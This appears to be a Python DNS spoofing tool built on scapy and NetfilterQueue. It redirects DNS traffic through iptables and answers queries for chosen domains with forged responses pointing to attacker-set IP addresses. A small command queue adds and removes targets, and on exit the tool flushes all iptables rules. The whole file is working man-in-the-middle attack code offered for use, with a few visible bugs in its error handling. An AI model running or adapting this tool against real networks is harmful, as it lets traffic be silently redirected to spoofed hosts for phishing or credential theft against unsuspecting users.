#!/usr/bin/env python3

__author__ = 'foxtrot_charlie'
__licence__ = 'GPLv2'

import queue
from scapy.all import *
from netfilterqueue import NetfilterQueue
from ipaddress import ip_address

logger = logging.getLogger("DNSSPOOFER")
logger.setLevel(logging.DEBUG)
fh = logging.FileHandler('dnsdeceiver.log')
formatter = logging.Formatter("%(name)s; %(asctime)s; %(levelname)s; %(message)s", "%Y-%m-%d %H:%M:%S")
fh.setFormatter(formatter)
logger.addHandler(fh)
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# _iptablesr_ = "iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1"
# _iptablesr_ =  "iptables -I FORWARD -j NFQUEUE --queue-num 1"
#_iptablesr_ = "iptables -I FORWARD -j NFQUEUE --queue-num 1"
_iptablesr_ = "iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1"
_iptablesrm_ = "iptables -F && iptables -X && iptables -t nat -F && iptables -t nat -X"


class DNSSpoofer(threading.Thread):

    def __init__(self, event, queue, config={}):
        threading.Thread.__init__(self)
        self.event = event
        logger.debug('Inserting iptables rules: {}'.format(_iptablesr_))
        try:
            os.system(_iptablesr_)
        except OSError:
            logger.critical('Cannot execute iptables rulse!')
            sys.exit(-1)
        self.queue = queue
        self.spoofaddr = {}  # should be thread safe - like all built-in types
        self.__load_config(config)
        self.configurator()
        print(config)

    def __load_config(self, config={}):
        self.spoofaddr = config.get('target', {})
        if not self.spoofaddr:
            logger.warning('No targets specified!')
        logger.debug('Targets set up! {}'.format(self.spoofaddr))

    def callback(self, packet):
        logger.critical("HIT!")
        if self.event.is_set():
            return

        payload = packet.get_payload()
        pkt = IP(payload)
        logger.debug(pkt.show(dump=True))
        flag = False

        if not pkt.haslayer(DNSQR):
            packet.accept()
            # TODO - edit packet if needed
        else:
            res = str(pkt[DNS].qd.qname, 'utf-8')
            logger.warning('HIT DNS RESPONSE! {}'.format(res))
            for i in self.spoofaddr.keys():
                if i in res:
                    key = i
                    if flag:
                        continue
                    # Build the spoofed response
                    spoofedPayload = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                      an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.spoofaddr[key]))

                    print("Spoofing DNS response to: ")
                    logger.debug(spoofedPayload.show(dump=True))
                    packet.drop()
                    send(spoofedPayload, verbose=False)
                    flag = True
                else:
                    logger.debug('Asked for nonspoofed domain! {}'.format(res))
                    if flag:
                        continue
                    packet.accept()
                    flag = True

    def configurator(self):
        if not self.event.is_set():
            while not self.queue.empty():
                logger.debug('FUNCTION HIT!')
                cmd = self.queue.get()
                self.__execute_cmd(cmd)

    def __execute_cmd(self, cmd):
        if len(cmd) == 0:
            logger.debug('INVALID FUNCTION')
            pass

        if len(cmd) == 1:
            if cmd[0] == "ls":
                logger.debug('LS FUNCTION')
                self.queue.put(['lsa', self.spoofaddr])
                logger.debug('LS FUNCTION ANSWER: {}'.format(self.spoofaddr))

        if len(cmd) == 2:
            if cmd[0] == 'r':
                target = cmd[1]
                if target in self.spoofaddr.keys():
                    logger.debug('RM FUNCTION')
                    self.spoofaddr.__delattr__(target)
                    logger.debug('RM FUNCTION COMPLETED: {}'.format(self.spoofaddr))
                else:
                    logger.warning('RM FUNCTION ERROR: Cannot find target: {}, omitting'.format(target))

        if len(cmd) == 3:
            if cmd[0] == 'a':
                logger.debug('ADD FUNCTION')
                ip = None
                try:
                    ip = ip_address(cmd[2])
                except ValueError:
                    ip = None
                    print("{} is not a valid IP address!")
                self.spoofaddr[cmd[1]] = str(ip)
                logger.debug('ADD FUNCTION COMPLETED: {}'.format(self.spoofaddr))

    @staticmethod
    def __run_threaded(q):
        try:
            q.run(False)  # Main loop
        except:
            msg = "Hard error occured! {}".format(e)
            logger.critical(msg)
            print(msg)


    def run(self):
        # This is the intercept
        q = NetfilterQueue()
        q.bind(1, self.callback)
        #t = threading.Thread(target=self.__run_threaded, args=(q,))
        # t.daemon = True
        # t.start()
        while not self.event.is_set():
            self.configurator()
            try:
                q.run()  # Main loop
            except:
                msg = "Hard error occured! {}".format(e)
                logger.critical(msg)
                print(msg)
            finally:
                q.unbind()
        print("DNSspoofer finishing!")
        try:
            logger.debug('Reverting iptables rules!')
            os.system(_iptablesrm_)
            logger.debug('Rules reverted!')
        except OSError:
            logger.critical('Cannot revert iptables rules!')
            sys.exit(-1)


if __name__ == '__main__':
    q = queue.Queue()
    e = threading.Event()
    dnss = DNSSpoofer(event=e, queue=q)
    dnss.run()
